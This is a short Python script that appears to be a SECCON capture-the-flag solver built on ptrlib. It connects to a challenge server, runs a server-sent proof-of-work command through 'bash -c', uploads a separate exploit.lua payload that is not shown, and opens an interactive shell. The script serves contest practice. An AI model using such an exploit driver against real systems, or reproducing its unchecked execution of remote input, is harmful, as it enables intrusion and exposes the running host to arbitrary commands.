from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9876"))

sock = Socket(HOST, PORT)
p = Process(["bash", "-c", sock.recvline().decode()])
token = p.recvregex("token: (.+)")[0]
p.close()
print(token)
sock.sendlineafter("token:", token)

sock.sendlineafter("):", open("exploit.lua", "rb").read())

sock.sh()

